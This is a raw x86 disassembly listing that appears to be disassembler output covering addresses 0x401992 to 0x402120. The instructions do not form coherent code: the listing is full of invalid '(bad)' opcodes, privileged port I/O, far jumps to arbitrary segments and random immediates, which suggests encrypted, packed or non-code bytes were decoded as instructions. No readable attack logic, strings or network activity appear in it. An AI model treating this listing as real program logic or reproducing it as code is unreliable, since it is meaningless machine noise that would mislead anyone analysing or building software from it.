  401992:	test   dh,dh
  401994:	mov    fs,WORD PTR [eax+0x7]
  401997:	ja     0x40196a
  401999:	jmp    0x1c48:0x639abae6
  4019a0:	add    al,0xc7
  4019a2:	stc    
  4019a3:	push   0x30
  4019a5:	lods   eax,DWORD PTR ds:[esi]
  4019a6:	mov    edx,0xfbf9b340
  4019ab:	or     eax,edi
  4019ad:	sahf   
  4019ae:	sub    ebp,ebx
  4019b0:	sbb    al,0x90
  4019b2:	sbb    esi,DWORD PTR [ebx+0x4a]
  4019b5:	retf   
  4019b6:	ss cmp al,0x6c
  4019b9:	retf   
  4019ba:	push   ebp
  4019bb:	add    bh,al
  4019bd:	mov    edx,0xce31bcd
  4019c2:	retf   0x5cd1
  4019c5:	ins    DWORD PTR es:[edi],dx
  4019c6:	rcr    DWORD PTR [ebx+ebp*1+0xd0bcab7],cl
  4019cd:	lock inc edi
  4019cf:	push   esp
  4019d0:	int    0x5a
  4019d2:	mov    bl,0x4c
  4019d4:	mov    dh,0x4c
  4019d6:	in     eax,0xbc
  4019d8:	rcr    BYTE PTR [esi*4-0x610e3de4],1
  4019df:	pop    eax
  4019e0:	daa    
  4019e1:	or     BYTE PTR [edx-0x4e],bl
  4019e4:	in     eax,dx
  4019e5:	ss dec edx
  4019e7:	repnz add esi,DWORD PTR [edx]
  4019ea:	arpl   WORD PTR fs:[ecx],si
  4019ed:	shl    DWORD PTR fs:[ebx+0xc],cl
  4019f1:	in     eax,dx
  4019f2:	sub    BYTE PTR [ecx+edx*8+0xf],0xd6
  4019f7:	enter  0xe98f,0x51
  4019fb:	pop    edi
  4019fc:	scas   al,BYTE PTR es:[edi]
  4019fd:	sub    DWORD PTR [ebx-0x4],ebx
  401a00:	or     BYTE PTR [eax+ebp*2-0x54177395],dh
  401a07:	sub    al,0x1c
  401a09:	sahf   
  401a0a:	push   ecx
  401a0b:	shl    BYTE PTR ds:0xfe12b399,1
  401a11:	or     eax,0xb83b7b81
  401a16:	pop    es
  401a17:	mov    ds:0x1dacd58b,al
  401a1c:	rcr    BYTE PTR [ebx-0x4e],1
  401a1f:	jne    0x401a6c
  401a21:	mov    ds:0x8bd4b09c,eax
  401a26:	dec    ecx
  401a27:	(bad)  
  401a28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a29:	push   cs
  401a2a:	loope  0x4019d7
  401a2c:	xor    al,0xc3
  401a2e:	ds dec esp
  401a30:	pop    ebp
  401a31:	das    
  401a32:	mov    esp,0xbc048b7a
  401a37:	data16 mov bl,0x51
  401a3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a3b:	adc    al,0xb
  401a3d:	cmp    ebp,DWORD PTR ds:0x263468a8
  401a43:	and    DWORD PTR [esi-0x70],0xffffffde
  401a47:	in     eax,dx
  401a48:	stc    
  401a49:	outs   dx,DWORD PTR ds:[esi]
  401a4a:	aam    0xef
  401a4c:	rcl    DWORD PTR [ebp+0x1cfb5a88],1
  401a52:	add    DWORD PTR [ebx-0x35],esp
  401a55:	clc    
  401a56:	adc    eax,0xd46ba1a5
  401a5b:	test   BYTE PTR [edx+0x11ae59c3],bh
  401a61:	xchg   BYTE PTR [ecx],cl
  401a63:	stos   BYTE PTR es:[edi],al
  401a64:	jle    0x401a43
  401a66:	mov    edx,0x510903da
  401a6b:	scas   eax,DWORD PTR es:[edi]
  401a6c:	mov    dl,0x6a
  401a6e:	jmp    0x4019fb
  401a70:	dec    ecx
  401a71:	ins    DWORD PTR es:[edi],dx
  401a72:	sub    bh,dl
  401a74:	mov    bl,BYTE PTR [ebp-0x7f6da86e]
  401a7a:	mov    ebx,0xf7f2a145
  401a7f:	aam    0x1d
  401a81:	and    ebx,ebx
  401a83:	sub    eax,0x69fb2b2f
  401a88:	(bad)  
  401a89:	jbe    0x401a42
  401a8b:	hlt    
  401a8c:	repnz fisub WORD PTR [edi*2+0x65f869d8]
  401a94:	cmp    ecx,DWORD PTR [edx-0x6a]
  401a97:	sub    ch,BYTE PTR [ecx]
  401a99:	dec    ebx
  401a9a:	mov    BYTE PTR [esi+edi*2],cl
  401a9d:	repnz (bad) 
  401a9f:	or     eax,0xfc55b217
  401aa4:	retf   
  401aa5:	cs ins DWORD PTR es:[edi],dx
  401aa7:	aad    0xff
  401aa9:	mov    ebp,0x45291b05
  401aae:	mov    ds:0xa7d1916a,al
  401ab3:	(bad)  
  401ab4:	jmp    0x329f3253
  401ab9:	jne    0x401a7f
  401abb:	mov    eax,ds:0x82c7ec6c
  401ac0:	sub    al,0x17
  401ac2:	in     al,dx
  401ac3:	pop    ebx
  401ac4:	push   ebx
  401ac5:	pop    ds
  401ac6:	in     eax,dx
  401ac7:	pusha  
  401ac8:	pop    edi
  401ac9:	xchg   esi,eax
  401aca:	pop    esi
  401acb:	ja     0x401b02
  401acd:	push   esp
  401ace:	adc    ch,cl
  401ad0:	push   eax
  401ad1:	fst    DWORD PTR [ecx-0x57]
  401ad4:	add    cl,BYTE PTR [esi+edi*2]
  401ad7:	pop    esp
  401ad8:	push   edi
  401ad9:	add    eax,0x8d2c2a7a
  401ade:	xchg   DWORD PTR [eax+0x40302a9b],ebp
  401ae4:	push   DWORD PTR [edx]
  401ae6:	sahf   
  401ae7:	mov    al,ds:0x26a7b6ac
  401aec:	jg     0x401b07
  401aee:	add    eax,0x5035bad9
  401af3:	sub    edx,DWORD PTR [ebx+0x58]
  401af6:	clc    
  401af7:	xchg   esi,eax
  401af8:	sub    al,0x8e
  401afa:	jo     0x401b16
  401afc:	outs   dx,BYTE PTR ds:[esi]
  401afd:	out    0xe7,eax
  401aff:	jmp    0xb3e70ee8
  401b04:	loop   0x401b64
  401b06:	sahf   
  401b07:	mov    edi,0xde6c3b30
  401b0c:	inc    esp
  401b0d:	mov    edi,0xbc96dec1
  401b12:	inc    esi
  401b13:	inc    edi
  401b14:	push   edi
  401b15:	leave  
  401b16:	popf   
  401b17:	jb     0x401b4d
  401b19:	int3   
  401b1a:	jmp    0x890f:0x9f3f8e61
  401b21:	call   0xaa24e66c
  401b26:	fadd   QWORD PTR [ecx+0x205837dc]
  401b2c:	push   es
  401b2d:	into   
  401b2e:	daa    
  401b2f:	fs sbb bh,ah
  401b32:	call   0x1151:0x74deb5fc
  401b39:	(bad)  
  401b3a:	fwait
  401b3b:	cmp    eax,0x297ead53
  401b40:	sbb    BYTE PTR ds:0x774605d3,dh
  401b46:	(bad)  
  401b47:	imul   esp,DWORD PTR cs:[ebx-0x7],0xffffff81
  401b4c:	xor    al,0x2d
  401b4e:	pop    ss
  401b4f:	dec    esp
  401b50:	xchg   ebp,eax
  401b51:	or     BYTE PTR [ebx+ebp*4],ch
  401b54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b55:	sub    DWORD PTR [edx+edx*8-0x4e],0x6c
  401b5a:	push   es
  401b5b:	cli    
  401b5c:	push   cs
  401b5d:	jo     0x401afa
  401b5f:	nop
  401b60:	les    eax,FWORD PTR [edi+0x4f]
  401b63:	stc    
  401b64:	cs loope 0x401b29
  401b67:	addr16 mov ecx,0x1081a797
  401b6d:	data16 or al,0xfe
  401b70:	cmp    ch,ch
  401b72:	pop    ebp
  401b73:	(bad)  
  401b74:	call   0x60dc:0xaf2f6e4a
  401b7b:	js     0x401beb
  401b7d:	popf   
  401b7e:	cmp    DWORD PTR [esi-0x4c8a4251],edi
  401b84:	xlat   BYTE PTR ds:[ebx]
  401b85:	cwde   
  401b86:	mov    dh,0xb8
  401b88:	pop    es
  401b89:	pop    ss
  401b8a:	ret    0xec70
  401b8d:	cmc    
  401b8e:	iret   
  401b8f:	push   edx
  401b90:	sti    
  401b91:	pop    edi
  401b92:	xor    al,0x25
  401b94:	or     dl,BYTE PTR [edx]
  401b96:	icebp  
  401b97:	mov    bl,0x9c
  401b99:	leave  
  401b9a:	ss daa 
  401b9c:	add    cl,ch
  401b9e:	push   0xc8f99ac8
  401ba3:	mov    dh,0x95
  401ba5:	jle    0x401b5c
  401ba7:	lods   eax,DWORD PTR ds:[esi]
  401ba8:	mov    eax,ds:0x7c0e9ba
  401bad:	out    0x95,al
  401baf:	jmp    0x25ad:0xc9aa35aa
  401bb6:	pop    es
  401bb7:	inc    ebx
  401bb8:	push   esi
  401bb9:	cld    
  401bba:	arpl   WORD PTR [edx+eiz*8+0x68],si
  401bbe:	outs   dx,BYTE PTR ds:[esi]
  401bbf:	repz leave 
  401bc1:	imul   edi,DWORD PTR [eax+0x74ca69a2],0xffffff98
  401bc8:	jnp    0x401b62
  401bca:	sub    al,0x0
  401bcc:	push   ds
  401bcd:	(bad)  
  401bce:	(bad)  
  401bcf:	imul   esi,DWORD PTR [eax-0x73d5d585],0x66
  401bd6:	xchg   ebp,eax
  401bd7:	dec    ebx
  401bd8:	pop    ss
  401bd9:	push   0xe6b61823
  401bde:	adc    esi,DWORD PTR [ebp+0x45]
  401be1:	push   ds
  401be2:	inc    ecx
  401be3:	call   0x344e75cf
  401be8:	outs   dx,DWORD PTR ds:[esi]
  401be9:	xchg   ebx,eax
  401bea:	scas   eax,DWORD PTR es:[edi]
  401beb:	sbb    DWORD PTR [ecx+0x64f5ee7],esp
  401bf1:	push   ebp
  401bf2:	je     0x401c48
  401bf4:	mov    BYTE PTR [esi+0x37],ch
  401bf7:	adc    DWORD PTR fs:[edx],edi
  401bfa:	add    eax,0xf37ece91
  401bff:	je     0x401bfe
  401c01:	mul    BYTE PTR [ebx]
  401c03:	imul   edx,DWORD PTR [edi],0x9c75eea5
  401c09:	adc    al,0x39
  401c0b:	xchg   edi,eax
  401c0c:	mul    DWORD PTR [edi-0x1fe4bba9]
  401c12:	xchg   ebp,eax
  401c13:	and    DWORD PTR [ebp+ebp*1+0x39],edx
  401c17:	mov    bh,0x6c
  401c19:	and    BYTE PTR [edi-0x12],0x70
  401c1d:	xchg   DWORD PTR ds:0x3dee2617,esi
  401c23:	mov    edi,0x2f4016bd
  401c28:	(bad)  
  401c29:	out    dx,eax
  401c2a:	bsf    edx,DWORD PTR [edx+0x1938ce2e]
  401c31:	mov    edi,DWORD PTR [esi+0x76537d65]
  401c37:	xchg   ecx,eax
  401c38:	cmc    
  401c39:	(bad)  
  401c3a:	loopne 0x401bea
  401c3c:	jmp    0x401ca1
  401c3e:	lods   eax,DWORD PTR ds:[esi]
  401c3f:	cmp    al,BYTE PTR [eax+0x1a]
  401c42:	dec    eax
  401c43:	into   
  401c44:	add    DWORD PTR [edx-0x13],edi
  401c47:	inc    edx
  401c48:	adc    ebp,DWORD PTR [esi-0x4b]
  401c4b:	lea    edi,[eax]
  401c4d:	sub    DWORD PTR [edx],edi
  401c4f:	test   eax,0xaa859acb
  401c54:	dec    ebp
  401c55:	(bad)  
  401c56:	not    esp
  401c58:	ins    DWORD PTR es:[edi],dx
  401c59:	(bad)  
  401c5a:	adc    ecx,ecx
  401c5c:	(bad)  
  401c5d:	cdq    
  401c5e:	and    cl,BYTE PTR [esi-0x43]
  401c61:	or     eax,0x907deba2
  401c66:	jp     0x401c50
  401c68:	popf   
  401c69:	xor    eax,0x762ae6e8
  401c6e:	gs jbe 0x401c89
  401c71:	mov    bl,0x19
  401c73:	les    eax,FWORD PTR [ebx+0x33]
  401c76:	mov    bh,0xa7
  401c78:	loop   0x401c34
  401c7a:	and    bh,BYTE PTR [edx-0x28]
  401c7d:	push   0xb6a4e9c2
  401c82:	gs jg  0x401c32
  401c85:	jp     0x401c94
  401c87:	jl     0x401caa
  401c89:	or     al,0x7d
  401c8b:	adc    al,0xc3
  401c8d:	and    esp,DWORD PTR [ebx-0x6ffc5ed]
  401c93:	jle    0x401c61
  401c95:	inc    esi
  401c96:	mov    WORD PTR [edi+0x68],gs
  401c99:	push   0xbe3b49a1
  401c9e:	dec    esi
  401c9f:	mov    ch,0x9c
  401ca1:	adc    eax,0xce9655c6
  401ca6:	and    DWORD PTR [edx+0x35],ebx
  401ca9:	push   0x4039beb7
  401cae:	and    al,0xf7
  401cb0:	mov    eax,ds:0x2b528e8c
  401cb5:	adc    ecx,DWORD PTR ds:0xde5bce84
  401cbb:	shr    BYTE PTR [ebp+0x7bfdedad],cl
  401cc1:	xor    al,0x7a
  401cc3:	ret    
  401cc4:	dec    eax
  401cc5:	std    
  401cc6:	ja     0x401c8c
  401cc8:	inc    edi
  401cc9:	and    esi,ecx
  401ccb:	pop    edx
  401ccc:	data16 add BYTE PTR [eiz*8+0x77ee5b27],ch
  401cd4:	push   ebp
  401cd5:	iret   
  401cd6:	jge    0x401cf5
  401cd8:	out    dx,al
  401cd9:	inc    esp
  401cda:	stos   BYTE PTR es:[edi],al
  401cdb:	test   eax,0x6046eb28
  401ce0:	in     al,dx
  401ce1:	push   ecx
  401ce2:	cli    
  401ce3:	and    al,0x6d
  401ce5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ce6:	xor    al,0x70
  401ce8:	(bad)  
  401cea:	cdq    
  401ceb:	or     ecx,DWORD PTR [ebx+0x4b8664ea]
  401cf1:	or     ebx,ebp
  401cf3:	jb     0x401d42
  401cf5:	fucomi st,st(5)
  401cf7:	cmp    dh,BYTE PTR [ebp+0x1b449a2e]
  401cfd:	lds    ebp,FWORD PTR [eax]
  401cff:	iret   
  401d00:	addr16 inc edi
  401d02:	xchg   esi,eax
  401d03:	js     0x401d20
  401d05:	int    0xb8
  401d07:	xor    ah,dl
  401d09:	sbb    esi,DWORD PTR [ecx-0x5f]
  401d0c:	adc    eax,0xb57ebe77
  401d11:	(bad)  [edi-0xd]
  401d14:	fidivr WORD PTR [edi-0x2b1cd477]
  401d1a:	je     0x401cee
  401d1c:	pop    eax
  401d1d:	and    al,0x28
  401d1f:	repz int 0xb9
  401d22:	push   fs
  401d24:	jmp    0x401d5c
  401d26:	mov    ds:0xf6dcdcc9,eax
  401d2b:	retf   0x2061
  401d2e:	xor    bh,BYTE PTR [eax+0xe]
  401d31:	mov    dl,0xb3
  401d33:	ret    0xe48b
  401d36:	jno    0x401d41
  401d38:	leave  
  401d39:	and    BYTE PTR [eax+0x6f],bh
  401d3c:	pop    esp
  401d3d:	lahf   
  401d3e:	nop
  401d3f:	jl     0x401d43
  401d41:	test   eax,0x2468f351
  401d46:	pop    eax
  401d47:	in     eax,dx
  401d48:	mov    al,ds:0xeb29af20
  401d4d:	dec    esi
  401d4e:	jae    0x401cfd
  401d50:	push   esp
  401d51:	call   0x48e8eb57
  401d56:	wbinvd 
  401d58:	ss push esi
  401d5a:	int3   
  401d5b:	mov    BYTE PTR [eax],0xb9
  401d5e:	jge    0x401dd8
  401d60:	clc    
  401d61:	jmp    0x401ddb
  401d63:	jbe    0x401da1
  401d65:	inc    ebx
  401d66:	push   edx
  401d67:	or     BYTE PTR [esi+edi*1-0x5b],0x50
  401d6c:	inc    esp
  401d6d:	(bad)  
  401d6e:	aas    
  401d6f:	iret   
  401d70:	cmp    esi,0x4d513be7
  401d76:	jmp    0x401de3
  401d78:	lds    ebp,FWORD PTR [ebp-0x733b829b]
  401d7e:	mov    ebx,0xe3e65364
  401d83:	xchg   edx,eax
  401d84:	sbb    BYTE PTR [edx],0x88
  401d87:	add    ebp,ebp
  401d89:	lods   eax,DWORD PTR ds:[esi]
  401d8a:	adc    DWORD PTR [ecx],esi
  401d8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d8d:	inc    ecx
  401d8e:	es int3 
  401d90:	xchg   ecx,eax
  401d91:	xor    bh,BYTE PTR [ebx+0x20]
  401d94:	cld    
  401d95:	out    0x80,eax
  401d97:	mov    ch,BYTE PTR [edx]
  401d99:	sti    
  401d9a:	adc    DWORD PTR ds:[edx+ebx*8],esi
  401d9e:	int3   
  401d9f:	sub    DWORD PTR [ecx],ebp
  401da1:	bound  esi,QWORD PTR [edi-0x2d]
  401da4:	mov    bl,al
  401da6:	es loopne 0x401def
  401da9:	loop   0x401d6a
  401dab:	fist   DWORD PTR [ecx-0x35107127]
  401db1:	pop    ebp
  401db2:	cmp    eax,edx
  401db4:	dec    esi
  401db5:	mov    al,ds:0xb4d0265c
  401dba:	test   al,0x48
  401dbc:	fidiv  WORD PTR [eax-0x80]
  401dbf:	outs   dx,BYTE PTR ds:[esi]
  401dc0:	nop
  401dc1:	cmc    
  401dc2:	push   0xc933fd5b
  401dc7:	in     al,dx
  401dc8:	fimul  WORD PTR ds:0xabc651a4
  401dce:	push   ds
  401dcf:	xor    al,0x6a
  401dd1:	inc    ebp
  401dd2:	mov    bh,cl
  401dd4:	aam    0x40
  401dd6:	dec    ebp
  401dd7:	(bad)  
  401dd8:	jp     0x401d6e
  401dda:	push   edi
  401ddb:	add    dh,bl
  401ddd:	data16 jge 0x401dba
  401de0:	dec    ecx
  401de1:	je     0x401dca
  401de3:	inc    eax
  401de4:	sub    ah,BYTE PTR [ecx+0x78]
  401de7:	mov    cl,0xe1
  401de9:	mov    edx,0x967f07d9
  401dee:	push   ecx
  401def:	loope  0x401e2a
  401df1:	mov    al,0x76
  401df3:	pop    ebx
  401df4:	lea    ebx,[ebp+0x44]
  401df7:	mov    cl,0xd
  401df9:	push   esi
  401dfa:	icebp  
  401dfb:	shr    BYTE PTR ds:0x6e4153a2,cl
  401e01:	je     0x401e17
  401e03:	push   ecx
  401e04:	rcl    BYTE PTR [si],0x9f
  401e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e09:	call   0x75ca8719
  401e0e:	dec    esi
  401e0f:	cmp    esp,DWORD PTR [ebx-0x72]
  401e12:	push   es
  401e13:	sub    DWORD PTR [esi+ebx*4-0x7f],ebp
  401e17:	sbb    BYTE PTR [edi],0x1b
  401e1a:	cmp    BYTE PTR ds:0x4305a8c6,al
  401e20:	pop    ds
  401e21:	sbb    BYTE PTR [ecx-0x4ee3948c],dh
  401e27:	ds dec eax
  401e2a:	inc    esp
  401e2b:	inc    ecx
  401e2c:	jecxz  0x401e15
  401e2e:	(bad)  
  401e2f:	xchg   ecx,eax
  401e30:	dec    edx
  401e31:	inc    esp
  401e32:	call   0x1b9b1e7f
  401e37:	inc    eax
  401e38:	mov    al,0x45
  401e3a:	popf   
  401e3b:	rol    BYTE PTR [edx],cl
  401e3d:	sbb    al,0x37
  401e3f:	retf   
  401e40:	into   
  401e41:	and    DWORD PTR cs:[ecx+0x1e],ebp
  401e45:	(bad)  
  401e46:	(bad)  
  401e47:	in     al,0xb1
  401e49:	mov    bl,0xfb
  401e4b:	data16 mov al,ds:0x44d469f3
  401e51:	in     al,dx
  401e52:	dec    esi
  401e53:	inc    esi
  401e54:	dec    ebp
  401e55:	ret    
  401e56:	pop    ebx
  401e57:	lea    esp,[ebx-0x5]
  401e5a:	jo     0x401e4e
  401e5c:	and    BYTE PTR gs:[ebx+ebp*8],ah
  401e60:	add    di,di
  401e63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e64:	cmp    DWORD PTR [ecx],ebp
  401e66:	inc    edx
  401e67:	jle    0x401e6a
  401e69:	aas    
  401e6a:	popa   
  401e6b:	retf   0xaab9
  401e6e:	scas   eax,DWORD PTR es:[edi]
  401e6f:	popa   
  401e70:	call   0xd900:0xefc0ae36
  401e77:	lods   al,BYTE PTR ds:[esi]
  401e78:	mov    es,WORD PTR [edx-0x1fcabee9]
  401e7e:	fs ret 
  401e80:	rol    esi,0x91
  401e83:	jge    0x401e18
  401e85:	out    dx,eax
  401e86:	data16 ds or al,0x59
  401e8a:	or     edi,DWORD PTR [edx-0x4c639b70]
  401e90:	pop    ds
  401e91:	mov    esp,0xcf450246
  401e96:	sbb    DWORD PTR [edx-0x1776309c],ebx
  401e9c:	jo     0x401e97
  401e9e:	and    al,0x5
  401ea0:	ror    BYTE PTR gs:[edx-0x35],1
  401ea4:	inc    esi
  401ea5:	sub    al,0x4d
  401ea7:	outs   dx,DWORD PTR ds:[esi]
  401ea8:	and    al,0xa3
  401eaa:	inc    esi
  401eab:	jnp    0x401e43
  401ead:	outs   dx,BYTE PTR ds:[esi]
  401eae:	test   eax,0xc4ba398b
  401eb3:	mov    al,0xe5
  401eb5:	in     eax,0x83
  401eb7:	push   0xffffffa1
  401eb9:	out    dx,al
  401eba:	out    0xa,eax
  401ebc:	mov    WORD PTR [esi],cs
  401ebe:	mov    edx,cs
  401ec0:	lock or esp,DWORD PTR [edx]
  401ec3:	push   edx
  401ec4:	aad    0xcf
  401ec6:	jmp    0x401ef3
  401ec8:	pop    ebx
  401ec9:	xor    BYTE PTR [ecx],dl
  401ecb:	lea    ebx,[edx+0x6c]
  401ece:	arpl   WORD PTR [edi+0x7387dfc5],di
  401ed4:	push   edi
  401ed5:	adc    eax,0x5aabcba8
  401eda:	mov    al,0xd1
  401edc:	sbb    DWORD PTR ds:0xf1baee15,ebx
  401ee2:	shl    BYTE PTR [eax-0x6aa4da81],1
  401ee8:	test   DWORD PTR [esi],ebx
  401eea:	mov    bl,BYTE PTR [ecx]
  401eec:	mov    al,ds:0xc1b07206
  401ef1:	in     al,0xfc
  401ef3:	sub    BYTE PTR [ecx-0x4d0c2ea7],ah
  401ef9:	mov    esp,0x9e4dd64d
  401efe:	pop    es
  401eff:	jle    0x401f55
  401f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f02:	jne    0x401f08
  401f04:	jno    0x401f29
  401f06:	pop    esi
  401f07:	pop    es
  401f08:	push   ebp
  401f09:	aaa    
  401f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f0b:	pop    edx
  401f0c:	pop    es
  401f0d:	stos   DWORD PTR es:[edi],eax
  401f0e:	iret   
  401f0f:	mov    DWORD PTR [ebx-0x6d39bdf5],ebp
  401f15:	jns    0x401f62
  401f17:	mov    ah,0xa0
  401f19:	das    
  401f1a:	add    al,BYTE PTR [ecx-0x70]
  401f1d:	in     eax,dx
  401f1e:	aas    
  401f1f:	jmp    0xbdbc0f4
  401f24:	fdiv   DWORD PTR [edx+0x381d8028]
  401f2a:	push   ss
  401f2b:	xchg   esi,eax
  401f2c:	ds inc ecx
  401f2e:	not    bl
  401f30:	loope  0x401f65
  401f32:	xchg   ebx,eax
  401f33:	jnp    0x401f09
  401f35:	sub    al,0x7a
  401f37:	jle    0x401f03
  401f39:	ret    
  401f3a:	popf   
  401f3b:	int3   
  401f3c:	and    esp,DWORD PTR [eax-0x2e]
  401f3f:	and    BYTE PTR [ebx],dl
  401f41:	inc    esp
  401f42:	imul   esi,DWORD PTR [ecx-0x1e],0x72d9d152
  401f49:	or     BYTE PTR [ebp+0xb6fed5b],al
  401f4f:	popf   
  401f50:	cdq    
  401f51:	cwde   
  401f52:	cwde   
  401f53:	mov    bl,0x32
  401f55:	rcl    al,cl
  401f57:	ret    0x1a63
  401f5a:	jge    0x401f7d
  401f5c:	jmp    0xfb6872bc
  401f61:	jnp    0x401f56
  401f63:	fs stos BYTE PTR es:[edi],al
  401f65:	inc    ebx
  401f66:	loope  0x401f01
  401f68:	loop   0x401fdf
  401f6a:	cs mov bl,0x4
  401f6d:	xchg   esi,eax
  401f6e:	stos   BYTE PTR es:[edi],al
  401f6f:	xchg   ebx,eax
  401f70:	clc    
  401f71:	jmp    0x7bf2:0xdf91b46d
  401f78:	mov    DWORD PTR [esi],esi
  401f7a:	pop    DWORD PTR [esi-0x4f859c0a]
  401f80:	jae    0x401fa1
  401f82:	dec    esi
  401f83:	adc    BYTE PTR [edi],cl
  401f85:	popa   
  401f86:	mov    cl,0xe1
  401f88:	repnz pop ecx
  401f8a:	mov    ds:0x27853ab9,al
  401f8f:	addr16 add esi,esi
  401f92:	aad    0x67
  401f94:	jl     0x401f26
  401f96:	push   esi
  401f97:	cli    
  401f98:	cli    
  401f99:	push   ds
  401f9a:	adc    eax,0xc7168c02
  401f9f:	cmp    ecx,ebx
  401fa1:	or     BYTE PTR [esi-0x1084bede],bh
  401fa7:	xchg   ebp,eax
  401fa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fa9:	or     al,0xa
  401fab:	outs   dx,DWORD PTR ds:[esi]
  401fac:	inc    esi
  401fad:	mov    dl,0xfb
  401faf:	and    DWORD PTR [edi-0x7f],edx
  401fb2:	imul   ecx,DWORD PTR [ebx],0xd43333fd
  401fb8:	retf   
  401fb9:	sub    bl,BYTE PTR [edx]
  401fbb:	add    BYTE PTR [edx-0x2c],dl
  401fbe:	inc    ecx
  401fbf:	or     DWORD PTR [edi],esp
  401fc1:	jle    0x40202f
  401fc3:	pop    esi
  401fc4:	ret    
  401fc5:	outs   dx,BYTE PTR ds:[esi]
  401fc6:	ret    0x54fe
  401fc9:	xchg   esi,eax
  401fca:	ins    BYTE PTR es:[edi],dx
  401fcb:	push   ebx
  401fcc:	jecxz  0x402009
  401fce:	mov    al,0x2f
  401fd0:	jl     0x401fa7
  401fd2:	xchg   esi,eax
  401fd3:	retf   0x2084
  401fd6:	test   eax,0x7692ac54
  401fdb:	jmp    0xb7bb49c
  401fe0:	je     0x401f78
  401fe2:	icebp  
  401fe3:	into   
  401fe4:	rol    DWORD PTR [edi+eiz*4],1
  401fe7:	mov    ds:0x911bd0fb,al
  401fec:	into   
  401fed:	mov    al,0xc
  401fef:	in     al,dx
  401ff0:	mov    eax,0x594d24a4
  401ff5:	pusha  
  401ff6:	mov    edx,0x495d3c39
  401ffb:	retf   0x5bfd
  401ffe:	push   esi
  401fff:	push   esi
  402000:	in     al,dx
  402001:	ret    
  402002:	in     eax,0x66
  402004:	and    esp,esi
  402006:	inc    ebp
  402007:	in     al,dx
  402008:	int3   
  402009:	xchg   BYTE PTR [ebx-0x70],bh
  40200c:	sbb    eax,0xb49d5088
  402011:	lods   al,BYTE PTR ds:[esi]
  402012:	cmc    
  402013:	push   edx
  402014:	pop    ds
  402015:	push   0x4fc53020
  40201a:	test   BYTE PTR [ecx],dl
  40201c:	repnz inc ebp
  40201e:	pop    eax
  40201f:	jg     0x40205f
  402021:	sub    BYTE PTR [edx-0x6c],dl
  402024:	ins    BYTE PTR es:[edi],dx
  402025:	jmp    0x20441000
  40202a:	daa    
  40202b:	outs   dx,BYTE PTR ds:[esi]
  40202c:	and    DWORD PTR [eax],edi
  40202e:	repnz pushf 
  402030:	push   eax
  402031:	es dec eax
  402033:	pop    edi
  402034:	bound  esp,QWORD PTR [ebx+0x6fcfcb56]
  40203a:	xchg   esp,eax
  40203b:	fsubr  st,st(4)
  40203d:	je     0x4020bd
  40203f:	pop    ss
  402040:	aas    
  402041:	inc    ebp
  402042:	lock mov ah,0x36
  402045:	or     ebx,DWORD PTR [edx]
  402047:	mov    eax,ds:0xa061c95d
  40204c:	sbb    BYTE PTR [edi+0x72],cl
  40204f:	xor    BYTE PTR [edi+0x7b673bba],cl
  402055:	jns    0x402054
  402057:	repnz in eax,0x9f
  40205a:	nop
  40205b:	cmp    al,0x7c
  40205d:	inc    esi
  40205e:	jns    0x402062
  402060:	icebp  
  402061:	and    edi,DWORD PTR [ebp-0x525a9528]
  402067:	push   0x860a03c2
  40206c:	mov    ebx,0xf3a3a59
  402071:	push   es
  402072:	ret    0x944
  402075:	sti    
  402076:	out    dx,al
  402077:	mov    al,0xa3
  402079:	sub    al,0x87
  40207b:	imul   ebx
  40207d:	mov    bh,0x5c
  40207f:	mov    bl,0x49
  402081:	cmp    ecx,esp
  402083:	(bad)  
  402084:	pop    ds
  402085:	xchg   BYTE PTR [edx-0x1],ah
  402088:	mov    cl,0xfd
  40208a:	sbb    DWORD PTR ds:[edx],edx
  40208d:	or     BYTE PTR [ecx*4+0x6ef6e26e],bh
  402094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402095:	arpl   WORD PTR [esi],bp
  402097:	out    0x6e,eax
  402099:	jmp    0xacc1:0x42f5276e
  4020a0:	cmp    ecx,esp
  4020a2:	jle    0x4020c7
  4020a4:	das    
  4020a5:	das    
  4020a6:	(bad)  
  4020a7:	mov    ch,0x78
  4020a9:	xor    ebp,eax
  4020ab:	inc    esp
  4020ac:	idiv   ch
  4020ae:	xchg   DWORD PTR [ecx],edi
  4020b0:	in     al,0x4a
  4020b2:	cli    
  4020b3:	xor    ebp,ebp
  4020b5:	aas    
  4020b6:	repnz (bad) 
  4020b8:	loopne 0x402055
  4020ba:	xchg   esi,eax
  4020bb:	pushw  0x0
  4020be:	test   eax,0xe6493bb4
  4020c3:	in     al,dx
  4020c4:	inc    ebx
  4020c5:	mov    ebp,DWORD PTR [ecx+ebp*4]
  4020c8:	mov    eax,ds:0x827b2b24
  4020cd:	jns    0x402059
  4020cf:	inc    esi
  4020d0:	shr    BYTE PTR [ebx+edx*8],0x9a
  4020d4:	fistp  DWORD PTR [edx]
  4020d6:	sbb    DWORD PTR [esi+0x75],0x73
  4020da:	xchg   ebp,eax
  4020db:	xchg   edi,eax
  4020dc:	mov    ah,0xa7
  4020de:	test   bl,dh
  4020e0:	ficom  DWORD PTR [ebp+0x6d]
  4020e3:	lea    ebp,[edx+0x71c8cdd9]
  4020e9:	inc    ebp
  4020ea:	jbe    0x40208e
  4020ec:	jg     0x4020bc
  4020ee:	imul   ebp,DWORD PTR [edi+ebx*8],0x46
  4020f2:	sbb    DWORD PTR [ecx],eax
  4020f4:	loopne 0x4020c0
  4020f6:	popf   
  4020f7:	push   ss
  4020f8:	add    BYTE PTR [esi],dh
  4020fa:	psubusb mm5,QWORD PTR [ebx+0x39]
  4020fe:	repnz push ecx
  402100:	div    dl
  402102:	test   DWORD PTR [ecx+0x754e66df],esp
  402108:	jmp    0x402122
  40210a:	cmp    BYTE PTR [edx-0x16],ah
  40210d:	std    
  40210e:	or     ebp,DWORD PTR [ebx+0x314db2b5]
  402114:	sub    dh,BYTE PTR [ebx+0x72d713bd]
  40211a:	sub    BYTE PTR [edi-0x44422954],bh
  402120:	iret   
